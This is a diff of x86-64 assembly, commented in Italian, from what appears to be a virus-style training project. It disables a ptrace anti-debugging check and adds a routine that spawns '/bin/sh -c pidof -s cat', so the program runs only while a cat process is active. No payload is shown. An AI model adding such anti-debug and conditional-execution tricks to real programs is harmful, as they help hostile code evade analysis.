@@ -65,22 +65,28 @@ _start:
     mov rbp, rsp                      ; salvo stato attuale stack
 
     ; ----------------------- Anti-Debug -----------------------
-    mov rax, 101                      ; ptrace
-    mov rdi, 0                        ; PTRACE_TRACEME
-    mov rsi, 0
-    mov rdx, 1
-    mov r10, 0
-    syscall
-    cmp rax, 0
-    jnl .pass
+;    mov rax, 101                      ; ptrace
+;    mov rdi, 0                        ; PTRACE_TRACEME
+;    mov rsi, 0
+;    mov rdx, 1
+;    mov r10, 0
+;    syscall
+;    cmp rax, 0
+;    jnl .pass_first_check
+;
+;    mov rax, 60
+;    mov rdi, 0
+;    syscall
 
-    mov rax, 60
-    mov rdi, 0
-    syscall
-
-    .pass:
+    .pass_first_check:
+    ; --------- Controllo se il processo cat è attivo ----------
+    call check_process
+    cmp eax, 1
+    je .pass_second_check
+    jne exit
     ; ----------------------------------------------------------
 
+    .pass_second_check:
     sub rsp, 16                       ; riservo spazio per /tmp/test
     mov dword [rsp+8], `t/\0\0`
     mov dword [rsp+4], '/tes'
@@ -357,6 +363,82 @@ strcmp:
     .positive:
         mov rax, 1                    ;return 1
         ret
+
+check_process:
+    ; int status = 0;
+    sub rsp, 8
+
+    ; rax = fork()
+    mov rax, 57
+    syscall
+    cmp rax, 0
+    ; if rax == 0
+    je .figlio
+    ; else
+        ;wait4(pid, 0, 0, 0)
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0
+    mov r10, 0
+    mov rax, 61
+    syscall
+
+    xor rsi, rsi
+    xor rdi, rdi
+    mov esi, 1
+
+    mov rax, [rsp]
+    bt rax, 8
+    ;jc .non_attivo
+    cmovc eax, esi
+    cmovnc eax, edi
+    add rsp, 8
+    ret
+
+    .figlio:
+        ; rdi = '/bin/sh\0'
+        sub rsp, 12
+        mov dword [rsp+4], `/sh\0`
+        mov dword [rsp], '/bin'
+        mov rdi, rsp
+
+        ; rsi = '-c'
+        sub rsp, 8
+        mov dword [rsp], `-c\0\0`
+        mov rsi, rsp
+
+        ; rdx = 'pidof -s cat'
+        sub rsp, 20
+        mov dword [rsp+12], `\0\0\0\0`
+        mov dword [rsp+8], ' cat'
+        mov dword [rsp+4], 'f -s'
+        mov dword [rsp], 'pido'
+        mov rdx, rsp
+
+        ; r10 = 0
+        xor rax, rax
+        push rax
+        mov r10, rsp
+
+        ; rsi = argv per execve
+        sub rsp, 40
+        mov qword [rsp+24], r10
+        mov qword [rsp+16], rdx
+        mov qword [rsp+8], rsi
+        mov qword [rsp], rdi
+        mov rsi, rsp
+
+        xor rdx, rdx
+        ; execve
+        mov rax, 59
+        syscall
+        ;cmp rax, 0
+        ;jl .exit
+
+    .exit:
+        mov rdi, 0
+        mov rax, 60
+        syscall
 
 exit:
     mov rdi, [rbp + 8 * 1]            ; rdi = ptr filename
